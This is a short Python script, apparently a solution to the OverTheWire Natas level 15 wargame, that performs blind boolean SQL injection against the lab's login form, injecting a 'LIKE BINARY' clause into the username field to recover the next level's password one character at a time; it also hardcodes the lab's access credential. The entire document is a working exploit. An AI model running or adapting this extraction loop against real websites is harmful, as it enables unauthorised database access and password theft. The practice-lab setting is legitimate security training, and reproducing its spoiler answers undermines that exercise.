import requests

session = requests.session()
url = "http://natas15.natas.labs.overthewire.org/"
session.auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"  # string.printable
flag = ""
char_index = 0
while char_index < len(chars):
    current_char = chars[char_index]
    print("trying char " + current_char)
    r = session.post(url, data={"username": 'natas16" and password LIKE BINARY "' + flag + current_char + "%"})
    if r.text.find("This user exists") != -1:
        flag += current_char
        print("current flag: " + flag)
        char_index = 0
    else:
        char_index += 1
print("final flag is " + flag)
session.close()
